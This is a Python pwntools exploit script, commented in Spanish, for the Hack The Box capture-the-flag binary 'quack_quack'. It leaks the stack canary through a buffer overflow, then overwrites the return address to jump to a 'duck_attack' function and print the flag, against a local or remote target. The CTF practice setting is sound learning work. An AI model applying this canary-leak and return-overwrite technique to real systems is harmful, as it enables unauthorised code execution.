#!/usr/bin/python3
import signal
import sys
from pwn import *
import warnings
from argparse import ArgumentParser
def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

name_program = './quack_quack'

def leak_canary(r):
    '''
    0x7fffffffd860: 0x4141414141414141      0x000000000000000a 0x10 = 16
    0x7fffffffd870: 0x0000000000000000      0x0000000000000000 0x20 = 32
    0x7fffffffd880: 0x0000000000000000      0x0000000000000000 0x30 = 48
    0x7fffffffd890: 0x0000000000000000      0x0000000000000000 0x40 = 64
    0x7fffffffd8a0: 0x0000000000000000      0x0000000000000000 0x50 = 80
    0x7fffffffd8b0: 0x0000000000000000      0x0000000000000000 0x60 = 96
    0x7fffffffd8c0: 0x0000000000000000      0x0000000000000000 0x70 = 112
    0x7fffffffd8d0: 0x0000000000000000      0x5611841102355300 0x80 - 8 = 78 --> 0x00 byte de proteccion del canary necesito 1 mas para sobreescribir el 0x00 (0x79)
    0x7fffffffd8e0: 0x00007fffffffd900      0x000000000040162a
    0x7fffffffd8f0: 0x0000000000000000      0x5611841102355300
	'''
    r.sendlineafter('> ', b'A'* (0x59) + b'Quack Quack ')
    r.recvuntil('Quack Quack ')
    canary = u64(r.recv(7).rjust(8, b'\x00'))
    print(f'[+] Filtrando posicion de Canary: {canary:#04x}')
    return canary

def exploit(ip, puerto):
    if ip in ('127.0.0.1', 'localhost'):
        print("[+] Iniciando proceso local")
        r    = process(name_program)
    else:
        print("[+] Iniciando proceso remoto")
        r    = remote(ip, puerto)

    e = ELF(name_program)
    r.sendline(p64(0xdeadbeefdeadbeef)*(0xb) + p64(leak_canary(r)) + p64(0xdeadbeefdeadbeef) + p64(e.sym.duck_attack))
    print("[+] Recibiendo la flag")

    print(f'\n{r.recvline_contains(b"HTB").strip().decode()}\n')

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    parser.add_argument("-p", "--port", help="Puerto del host a analizar")

    args = parser.parse_args()
    exploit(args.ip,args.port)
